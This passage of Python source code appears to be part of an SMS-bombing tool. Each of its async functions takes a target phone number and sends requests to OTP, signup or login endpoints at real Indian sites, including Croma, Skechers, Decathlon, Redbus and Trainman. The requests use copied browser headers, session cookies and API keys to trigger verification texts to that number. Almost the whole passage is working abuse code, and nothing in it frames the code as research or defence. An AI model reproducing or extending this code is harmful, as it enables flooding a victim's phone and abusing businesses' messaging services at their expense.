                'origin': 'https://www.tendercuts.in',
                'referer': 'https://www.tendercuts.in/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }

            json_data = {
                'mobile': f'{tarnum}',
                'otp_mode': 'SIGNUP',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def croma(tarnum: int ):
        try:
            cookies = {
                'SESSION': 'NjBhZjZjYTAtMjc1YS00M2YwLTliOTUtODVmNGRkZDQyODhl',
            }

            headers = {
                'authority': 'api.tatadigital.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'client_id': 'CROMA-WEB-APP',
                'content-type': 'application/json',
                # 'cookie': 'SESSION=NjBhZjZjYTAtMjc1YS00M2YwLTliOTUtODVmNGRkZDQyODhl',
                'origin': 'https://www.croma.com',
                'referer': 'https://www.croma.com/',
                'sec-ch-ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44',
            }

            json_data = {
                'countryCode': '91',
                'sendOtp': True,
                'phone': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.tatadigital.com/api/v2/sso/check-phone', cookies=cookies, headers=headers, json=json_data) as response:
                    print(response.text) 
            return "done"
        except Exception as e:
            return "failed"
        
    async def skecher(tarnum: int ):
        try:
            cookies = {
                'sid': '3-fBtiLG6qAgnCn2dbfa16Jc_jgPTnXDfW0',
                'dwanonymous_994727fff0a64d37e3fbc8ef34b995e1': 'abvfEouUeqQ72gYmQ4f0V7RN96',
                '__cq_dnt': '1',
                'dw_dnt': '1',
                'dwsid': 'kpSfv_j1dGQ9Xh-r8wPRRu8voDHVfesHYK9qIoCLBBDmo7RCjnkFA4VAUNV2Iztej8JhIGMn5HKbMSoTizisww==',
                '_sfid_69f9': '{%22anonymousId%22:%22f97fa810e67eaa9c%22}',
                '_evga_5fd7': '{%22uuid%22:%22f97fa810e67eaa9c%22}',
                '_gcl_au': '1.1.1537150235.1679232084',
                '_gid': 'GA1.2.61017889.1679232084',
                '_gat_UA-115788897-3': '1',
                '_ga_PW30J0KXP2': 'GS1.1.1679232084.1.0.1679232084.60.0.0',
                '_hsu': 'hs.1679232084313.0d3dd0d24f',
                '_hscl': '',
                '_fbp': 'fb.1.1679232084706.567973459',
                '_clck': '489ws|1|fa1|0',
                'cto_bundle': 'ulWw5F9ld1ltJTJCbXBjQ1B1TkNBanhvV0RZUW5hVkhBd1NUaEclMkZ6JTJCdFoyJTJGYmQ4N2YxOVl0d3E0S3VsWk93MUFrd0JRWVQyZjgxVkxmdkNnTFpkeEdSWGliV0lQUiUyQnFGZWI2NXZ3b3klMkYlMkJsTVdmVXA1MVB6SlJPTm9xdDZzbndiaU9TZDZlTG9wZSUyRjd1ZnoxMzU1RjlObiUyQkdndVElM0QlM0Q',
                '_ga': 'GA1.2.16812864.1679232084',
                '_clsk': '1g0lvcy|1679232086116|1|1|r.clarity.ms/collect',
            }

            headers = {
                'authority': 'www.skechers.in',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'sid=3-fBtiLG6qAgnCn2dbfa16Jc_jgPTnXDfW0; dwanonymous_994727fff0a64d37e3fbc8ef34b995e1=abvfEouUeqQ72gYmQ4f0V7RN96; __cq_dnt=1; dw_dnt=1; dwsid=kpSfv_j1dGQ9Xh-r8wPRRu8voDHVfesHYK9qIoCLBBDmo7RCjnkFA4VAUNV2Iztej8JhIGMn5HKbMSoTizisww==; _sfid_69f9={%22anonymousId%22:%22f97fa810e67eaa9c%22}; _evga_5fd7={%22uuid%22:%22f97fa810e67eaa9c%22}; _gcl_au=1.1.1537150235.1679232084; _gid=GA1.2.61017889.1679232084; _gat_UA-115788897-3=1; _ga_PW30J0KXP2=GS1.1.1679232084.1.0.1679232084.60.0.0; _hsu=hs.1679232084313.0d3dd0d24f; _hscl=; _fbp=fb.1.1679232084706.567973459; _clck=489ws|1|fa1|0; cto_bundle=ulWw5F9ld1ltJTJCbXBjQ1B1TkNBanhvV0RZUW5hVkhBd1NUaEclMkZ6JTJCdFoyJTJGYmQ4N2YxOVl0d3E0S3VsWk93MUFrd0JRWVQyZjgxVkxmdkNnTFpkeEdSWGliV0lQUiUyQnFGZWI2NXZ3b3klMkYlMkJsTVdmVXA1MVB6SlJPTm9xdDZzbndiaU9TZDZlTG9wZSUyRjd1ZnoxMzU1RjlObiUyQkdndVElM0QlM0Q; _ga=GA1.2.16812864.1679232084; _clsk=1g0lvcy|1679232086116|1|1|r.clarity.ms/collect',
                'origin': 'https://www.skechers.in',
                'referer': 'https://www.skechers.in/register/',
                'sec-ch-ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'rurl': '1',
            }

            data = f'dwfrm_profile_customer_phone={tarnum}&phoneLogin=true'.encode()
            async with aiohttp.ClientSession() as sess:

                async with sess.post(
                'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            ) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def dentalcart(tarnum: int ):
        try:
            headers = {
                'authority': 'api-apollo.dentalkart.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': '',
                'content-type': 'application/json',
                'cookies': 'country_id=IN; country=India; currency_code=INR; _gcl_au=1.1.2050323954.1679233791; _gid=GA1.2.268070877.1679233792; _dc_gtm_UA-73902580-1=1; _nv_sess=232384256.1679233952.kSuXhmF0gTG0uNEjMrZDbLdv0xENUFcMHGLxG86Akw66qVv0iI; _nv_uid=232384256.1679233952.7f02b1f8-ee36-4558-b0f4-0a7557ccbf93.1679233952.1679233952.1.0; _nv_utm=232384256.1679233952.1.1.dXRtc3JjPShkaXJlY3QpfHV0bWNjbj0oZGlyZWN0KXx1dG1jbWQ9KG5vbmUpfHV0bWN0cj0obm90IHNldCl8dXRtY2N0PShub3Qgc2V0KXxnY2xpZD0obm90IHNldCk=; _nv_did=232384256.1679233952.10318094170rczzb; _nv_hit=232384256.1679233952.cHZpZXc9MQ==; _ALGOLIA=anonymous-0f5e32fd-d22c-4341-8a73-8932d04f2cba; _fbp=fb.1.1679233792149.514608104; ln_or=eyIxMTUyNjUiOiJkIn0%3D; G_ENABLED_IDPS=google; _pin_unauth=dWlkPVltUmhZVFJqTm1JdE1qazBOaTAwTjJGbExXRTNOR0V0WkRSak9UVTRaR0l5WldZMg; _clck=1y24jie|1|fa1|0; _clsk=1oyr2b8|1679233794260|1|1|r.clarity.ms/collect; _ga=GA1.1.256003816.1679233792; _ga_L8SMBC7ZQ6=GS1.1.1679233802.1.0.1679233806.0.0.0',
                'origin': 'https://www.dentalkart.com',
                'platform': 'web',
                'referer': 'https://www.dentalkart.com/',
                'sec-ch-ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44',
                'x-api-key': 'da2-b7vqajjrfbgbvjf4fbesbavuhq',
            }

            json_data = {
                'operationName': 'createAccountOTP',
                'variables': {
                    'mobileNumber': f'{tarnum}',
                    'websiteId': 1,
                },
                'query': 'mutation createAccountOTP($mobileNumber: String, $websiteId: Int) {\n  createAccountOTP(mobileNumber: $mobileNumber, websiteId: $websiteId) {\n    status\n    message\n    __typename\n  }\n}\n',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api-apollo.dentalkart.com/graphql', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def lybra(tarnum: int ):
        try:
            cookies = {
                'suid': '32d9eae9-15a8-416c-a213-ecd85c73aac2',
                'est': '"utm_source=DIRECT|"',
                '_fbp': 'fb.1.1687032393419.197738972',
                'we_luid': '497887c5f56e1f24af6c5ff8e278f3867cd4952d',
                'JSESSIONID': 'F7498479789B0720515282F6761DDBAB',
                'countryCode': 'IN',
                'latitude': '0',
                'longitude': '0',
                '_gid': 'GA1.2.1082331684.1688837332',
                '_gat': '1',
                '_gcl_au': '1.1.1905491817.1688837339',
                '_ga': 'GA1.1.862002275.1687032393',
                'AWSALB': 'D/tq0iSfTC5AFY9Rxg3BRis3g0hdJkd2e+888d5cTt/7deATjltfPTOP+/iiiv8kuR5ME4YDRLYPBZ2LwbyCs1bkxY1ZWH/dYBbIgCAmhELUVsjisdDQGp8+JXwE',
                'AWSALBCORS': 'D/tq0iSfTC5AFY9Rxg3BRis3g0hdJkd2e+888d5cTt/7deATjltfPTOP+/iiiv8kuR5ME4YDRLYPBZ2LwbyCs1bkxY1ZWH/dYBbIgCAmhELUVsjisdDQGp8+JXwE',
                '_ga_1T7TVJNDEV': 'GS1.1.1688837339.1.1.1688837344.0.0.0',
            }

            headers = {
                'authority': 'www.lybrate.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                # 'cookie': 'suid=32d9eae9-15a8-416c-a213-ecd85c73aac2; est="utm_source=DIRECT|"; _fbp=fb.1.1687032393419.197738972; we_luid=497887c5f56e1f24af6c5ff8e278f3867cd4952d; JSESSIONID=F7498479789B0720515282F6761DDBAB; countryCode=IN; latitude=0; longitude=0; _gid=GA1.2.1082331684.1688837332; _gat=1; _gcl_au=1.1.1905491817.1688837339; _ga=GA1.1.862002275.1687032393; AWSALB=D/tq0iSfTC5AFY9Rxg3BRis3g0hdJkd2e+888d5cTt/7deATjltfPTOP+/iiiv8kuR5ME4YDRLYPBZ2LwbyCs1bkxY1ZWH/dYBbIgCAmhELUVsjisdDQGp8+JXwE; AWSALBCORS=D/tq0iSfTC5AFY9Rxg3BRis3g0hdJkd2e+888d5cTt/7deATjltfPTOP+/iiiv8kuR5ME4YDRLYPBZ2LwbyCs1bkxY1ZWH/dYBbIgCAmhELUVsjisdDQGp8+JXwE; _ga_1T7TVJNDEV=GS1.1.1688837339.1.1.1688837344.0.0.0',
                'origin': 'https://www.lybrate.com',
                'referer': 'https://www.lybrate.com/signup',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            }

            json_data = {
                'countryCode': 'IN',
                'firstName': 'bvfhsfgh',
                'mobile': f'{tarnum}',
                'password': '17094525',
                'email': 'jnjfdd@gmail.com',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.lybrate.com/p/login-signup', cookies=cookies, headers=headers, json=json_data)as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def decathon(tarnum: int ):
        try:
            cookies = {
                'location': 'location',
                'pincodeTooltip': 'true',
                'pincode': '560002',
                'city': 'Bengaluru',
                'state': 'Karnataka',
                '_vwo_uuid_v2': 'DDFB24C01E44A99589F0EF52449020E4E|3b9c39fa82c32f570707e1119bf8819a',
                '_vis_opt_s': '1%7C',
                '_vis_opt_test_cookie': '1',
                '_vwo_uuid': 'DDFB24C01E44A99589F0EF52449020E4E',
                '_vwo_ds': '3%241679233777%3A88.71006553%3A%3A',
                '_vwo_uuid_26': 'DDFB24C01E44A99589F0EF52449020E4E',
                '_vwo_sn': '0%3A1%3A%3A%3A1',
                '_vis_opt_exp_26_combi': '2',
                '_gcl_au': '1.1.1825914368.1679233623',
                '_gid': 'GA1.2.1280967157.1679233639',
                '_dc_gtm_UA-66814020-1': '1',
                '_ga_YSWCQHF8KL': 'GS1.1.1679233639.1.0.1679233639.0.0.0',
                '_ga': 'GA1.1.1099894913.1679233639',
                '__ywtfpcvuid': '14282370551679233639763',
                '__ywtfpcsuid': '1581664881679233639764',
                '_uetsid': '91acfce0c65c11edaaaca9083b2d5be7',
                '_uetvid': '91ad4ec0c65c11edaea5d544e88dfdc0',
                '_hjSessionUser_966591': 'eyJpZCI6Ijk5ZTZlNWM2LTJkYzAtNWQ0My1hMGFlLWZkOTI2OTkxNTE0MCIsImNyZWF0ZWQiOjE2NzkyMzM2NDEyMjUsImV4aXN0aW5nIjpmYWxzZX0=',
                '_hjFirstSeen': '1',
                '_hjIncludedInSessionSample_966591': '0',
                '_hjSession_966591': 'eyJpZCI6IjIwNTYyY2RjLWQ4ZmEtNDBiNy04Y2UzLWZkNjBmOGEwNWYzNiIsImNyZWF0ZWQiOjE2NzkyMzM2NDEyMzcsImluU2FtcGxlIjpmYWxzZX0=',
                '_hjAbsoluteSessionInProgress': '0',
                '_fbp': 'fb.1.1679233641347.306218317',
                'WZRK_G': 'd7ab473f9d9e42d4b2490128d0f93516',
                'WZRK_S_865-5WR-695Z': '%7B%22p%22%3A1%2C%22s%22%3A1679233840%2C%22t%22%3A1679233680%7D',
            }

            headers = {
                'authority': 'www.decathlon.in',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                # 'cookie': 'location=location; pincodeTooltip=true; pincode=560002; city=Bengaluru; state=Karnataka; _vwo_uuid_v2=DDFB24C01E44A99589F0EF52449020E4E|3b9c39fa82c32f570707e1119bf8819a; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=DDFB24C01E44A99589F0EF52449020E4E; _vwo_ds=3%241679233777%3A88.71006553%3A%3A; _vwo_uuid_26=DDFB24C01E44A99589F0EF52449020E4E; _vwo_sn=0%3A1%3A%3A%3A1; _vis_opt_exp_26_combi=2; _gcl_au=1.1.1825914368.1679233623; _gid=GA1.2.1280967157.1679233639; _dc_gtm_UA-66814020-1=1; _ga_YSWCQHF8KL=GS1.1.1679233639.1.0.1679233639.0.0.0; _ga=GA1.1.1099894913.1679233639; __ywtfpcvuid=14282370551679233639763; __ywtfpcsuid=1581664881679233639764; _uetsid=91acfce0c65c11edaaaca9083b2d5be7; _uetvid=91ad4ec0c65c11edaea5d544e88dfdc0; _hjSessionUser_966591=eyJpZCI6Ijk5ZTZlNWM2LTJkYzAtNWQ0My1hMGFlLWZkOTI2OTkxNTE0MCIsImNyZWF0ZWQiOjE2NzkyMzM2NDEyMjUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_966591=0; _hjSession_966591=eyJpZCI6IjIwNTYyY2RjLWQ4ZmEtNDBiNy04Y2UzLWZkNjBmOGEwNWYzNiIsImNyZWF0ZWQiOjE2NzkyMzM2NDEyMzcsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1679233641347.306218317; WZRK_G=d7ab473f9d9e42d4b2490128d0f93516; WZRK_S_865-5WR-695Z=%7B%22p%22%3A1%2C%22s%22%3A1679233840%2C%22t%22%3A1679233680%7D',
                'origin': 'https://www.decathlon.in',
                'referer': 'https://www.decathlon.in/',
                'sec-ch-ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44',
            }

            json_data = {
                'param': f'{tarnum}',
                'source': 1,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.decathlon.in/api/login/sendotp', cookies=cookies, headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def trainman(tarnum: int ):
        try:
            cookies = {
                '_fbp': 'fb.1.1678101239525.1621469544',
                '_gid': 'GA1.2.930425739.1678101243',
                '_gat_gtag_UA_99163760_1': '1',
                '_ga_HM91Q9LTGY': 'GS1.1.1678101243.1.1.1678101249.54.0.0',
                '_ga': 'GA1.2.1612900361.1678101243',
                '_gcl_au': '1.1.1069742548.1678101250',
            }

            headers = {
                'authority': 'www.trainman.in',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarym9QS2xBGu82M0ZOU',
                # 'cookie': '_fbp=fb.1.1678101239525.1621469544; _gid=GA1.2.930425739.1678101243; _gat_gtag_UA_99163760_1=1; _ga_HM91Q9LTGY=GS1.1.1678101243.1.1.1678101249.54.0.0; _ga=GA1.2.1612900361.1678101243; _gcl_au=1.1.1069742548.1678101250',
                'origin': 'https://www.trainman.in',
                'referer': 'https://www.trainman.in/auth/account',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
            }

            params = {
                'key': '012562ae-60a9-4fcd-84d6-f1354ee1ea48',
                'timestamp': '1678101261969',
            }

            data = f'------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{tarnum}\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU--\r\n'.encode()
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.trainman.in/services/user/signup', params=params, cookies=cookies, headers=headers, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def redbus(tarnum: int ):
        try:
            cookies = {
                'country': 'IND',
                'currency': 'INR',
                'selectedCurrency': 'INR',
                'language': 'en',
                'defaultlanguage': 'en',
                'bCore': '1',
                'defaultCountry': 'IND',
                'deviceSessionId': '741ee6b7-71df-49df-a5e9-bd133458e6eb',
                'lzFlag': '0',
                'bft': '1',
                'jfpj': 'd02da782b4481916cf4103ac50c70b79',
                'ak_bmsc': '09FFAD3584CBEBD9DDE1308E10EA72E8~000000000000000000000000000000~YAAQLAVaaK/ZJ6eGAQAAzZ2gthOw+lj0WeBqlxn4RsjSiq2GMlyIul4thg6A7bV+fjZ5NEoevzPGU+dB3uZSzXOIWbHYXdF+wVTKxDUdP2Sqsqt+yVAXy6i02EAxBGrnD8hFTjoV6qq1O2CUxYOzMjoHHJCAZeZRROcy6sXL1+2KeYhnOlYDTL4LCdSah+zTDonulBNxYO5Y8Tgit9Mdn1H0+6wYbfFoRDhBfWcR2wCfUaYE6Dh7kAxYGXZkU+CnznT3FbTIVJbCfA77Zqf3AhiRAtXMBl+fyBMysjtSsJNxdsnodVqlNyLrpe8IKE0k2SAa1BYiQWuWVE8z0ZNfX86c3aGWyYg0ESdto3J8hcHqHBdVB89xQKo+gnvR5Q8jrc+M6aq5P04XkZoCVG/MA0kOKS543Qzk82CPTUzmQW3YixkknodLkJD5n57opXpXL0qCJgz9oTPfqFkVnhf9AVf7fYzJcV/wh1hDHd40lRTrj+b6OzC4nOsatA==',
                'rb_fpData': '%7B%22browserName%22%3A%22Chrome%22%2C%22browserVersion%22%3A%22110.0.0.0%22%2C%22os%22%3A%22Windows%22%2C%22osVersion%22%3A%2210%22%2C%22screenSize%22%3A%221536%2C824%22%2C%22screenDPI%22%3A1.25%2C%22screenResolution%22%3A%221920x1080%22%2C%22screenColorDepth%22%3A24%2C%22aspectRatio%22%3A%2216%3A9%22%2C%22systemLanguage%22%3A%22en-US%22%2C%22connection%22%3A%224g%22%2C%22userAgent%22%3A%22mozilla/5.0%20%28windows%20nt%2010.0%3B%20win64%3B%20x64%29%20applewebkit/537.36%20%28khtml%2C%20like%20gecko%29%20chrome/110.0.0.0%20safari/537.36%20edg/110.0.1587.63%7CWin32%7Cen-US%22%2C%22timeZone%22%3A5.5%7D',
                '_gcl_au': '1.1.868109432.1678101069',
                'tvc_smc_bus': 'google / organic / (not set)',
                'tvc_session_alive_bus': '1',
                '_ga': 'GA1.2.1884233577.1678101069',
                '_gid': 'GA1.2.976903032.1678101069',
                'mriClientId': 'ea210a77-43dd-41ec-8202-67949e57d7a4-KSvCJicwOQLQ429R6Z%2F6Kg%3D%3D',
                'mriSessionId': '2615d9f5-8378-4cf2-9825-a04d37e07f2c-CRFLxMd1Fh273840E6lrp-eg%231M%3D',
                'mriClientIdSetDate': '3%2F6%2F23%2011%3A13%3A46%20AM',
                'isBrowserFP': 'true',
                'gClId': '1884233577.1678101069',
                'channel_name': 'MOBILE_WEB',
                'BusinessUnit': 'BUS',
                '_gat_UA-9782412-15': '1',
                '_dc_gtm_UA-9782412-15': '1',
                'bm_sv': 'B1991E05133992544C2BA93862B1D885~YAAQLAVaaKnbJ6eGAQAAq/6hthMX5A9vijQxyiCXyjjohRMJA1VQ2AHhIiD8JQnCrU19lo1PsXUxdNPER0QcjpT8M/XaYkcSOCCcsz3txupnV+F+2eSr7hgbp2BMLscwc1CS4wK/ev/UiCooYIF+hUAwtFpFlPLh+/jqKpxl7sGLrf7t6QMppztr7+TVCfMXqQDqVJBbic0iRCPbF/u9GR/UQM4QoGdvdJp0UhEvbOHJCBpTks7V6e7XW+JDc4I=~1',
            }

            headers = {
                'authority': 'www.redbus.in',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                # 'cookie': 'country=IND; currency=INR; selectedCurrency=INR; language=en; defaultlanguage=en; bCore=1; defaultCountry=IND; deviceSessionId=741ee6b7-71df-49df-a5e9-bd133458e6eb; lzFlag=0; bft=1; jfpj=d02da782b4481916cf4103ac50c70b79; ak_bmsc=09FFAD3584CBEBD9DDE1308E10EA72E8~000000000000000000000000000000~YAAQLAVaaK/ZJ6eGAQAAzZ2gthOw+lj0WeBqlxn4RsjSiq2GMlyIul4thg6A7bV+fjZ5NEoevzPGU+dB3uZSzXOIWbHYXdF+wVTKxDUdP2Sqsqt+yVAXy6i02EAxBGrnD8hFTjoV6qq1O2CUxYOzMjoHHJCAZeZRROcy6sXL1+2KeYhnOlYDTL4LCdSah+zTDonulBNxYO5Y8Tgit9Mdn1H0+6wYbfFoRDhBfWcR2wCfUaYE6Dh7kAxYGXZkU+CnznT3FbTIVJbCfA77Zqf3AhiRAtXMBl+fyBMysjtSsJNxdsnodVqlNyLrpe8IKE0k2SAa1BYiQWuWVE8z0ZNfX86c3aGWyYg0ESdto3J8hcHqHBdVB89xQKo+gnvR5Q8jrc+M6aq5P04XkZoCVG/MA0kOKS543Qzk82CPTUzmQW3YixkknodLkJD5n57opXpXL0qCJgz9oTPfqFkVnhf9AVf7fYzJcV/wh1hDHd40lRTrj+b6OzC4nOsatA==; rb_fpData=%7B%22browserName%22%3A%22Chrome%22%2C%22browserVersion%22%3A%22110.0.0.0%22%2C%22os%22%3A%22Windows%22%2C%22osVersion%22%3A%2210%22%2C%22screenSize%22%3A%221536%2C824%22%2C%22screenDPI%22%3A1.25%2C%22screenResolution%22%3A%221920x1080%22%2C%22screenColorDepth%22%3A24%2C%22aspectRatio%22%3A%2216%3A9%22%2C%22systemLanguage%22%3A%22en-US%22%2C%22connection%22%3A%224g%22%2C%22userAgent%22%3A%22mozilla/5.0%20%28windows%20nt%2010.0%3B%20win64%3B%20x64%29%20applewebkit/537.36%20%28khtml%2C%20like%20gecko%29%20chrome/110.0.0.0%20safari/537.36%20edg/110.0.1587.63%7CWin32%7Cen-US%22%2C%22timeZone%22%3A5.5%7D; _gcl_au=1.1.868109432.1678101069; tvc_smc_bus=google / organic / (not set); tvc_session_alive_bus=1; _ga=GA1.2.1884233577.1678101069; _gid=GA1.2.976903032.1678101069; mriClientId=ea210a77-43dd-41ec-8202-67949e57d7a4-KSvCJicwOQLQ429R6Z%2F6Kg%3D%3D; mriSessionId=2615d9f5-8378-4cf2-9825-a04d37e07f2c-CRFLxMd1Fh273840E6lrp-eg%231M%3D; mriClientIdSetDate=3%2F6%2F23%2011%3A13%3A46%20AM; isBrowserFP=true; gClId=1884233577.1678101069; channel_name=MOBILE_WEB; BusinessUnit=BUS; _gat_UA-9782412-15=1; _dc_gtm_UA-9782412-15=1; bm_sv=B1991E05133992544C2BA93862B1D885~YAAQLAVaaKnbJ6eGAQAAq/6hthMX5A9vijQxyiCXyjjohRMJA1VQ2AHhIiD8JQnCrU19lo1PsXUxdNPER0QcjpT8M/XaYkcSOCCcsz3txupnV+F+2eSr7hgbp2BMLscwc1CS4wK/ev/UiCooYIF+hUAwtFpFlPLh+/jqKpxl7sGLrf7t6QMppztr7+TVCfMXqQDqVJBbic0iRCPbF/u9GR/UQM4QoGdvdJp0UhEvbOHJCBpTks7V6e7XW+JDc4I=~1',
                'origin': 'https://www.redbus.in',
                'referer': 'https://www.redbus.in/help/login',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
            }

            json_data = {
                'mobileNo': f'{tarnum}',
                'phoneCode': '91',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://www.redbus.in/help/api/cx/generateOtp', cookies=cookies, headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"

    async def confirm(tarnum: int ):
        try:
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Origin': 'https://www.confirmtkt.com',
                'Referer': 'https://www.confirmtkt.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.get(
                f'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={tarnum}&newOtp=true&retry=false&testparamsp=true',
                headers=headers,
                ) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def physics(tarnum: int ):
        try:
            headers = {
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'client-version': '1819',
                'Authorization': 'Bearer',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://www.pw.live/',
                'randomId': '9242fe67-d24e-4fb1-8859-3d726e2471e3',
                'client-id': '5eb393ee95fab7468a79d189',
                'Client-Type': 'WEB',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'smsType': '0',
            }

            json_data = {
                'mobile': f'{tarnum}',
                'organizationId': '5eb393ee95fab7468a79d189',
            }
            async with aiohttp.ClientSession() as sess:
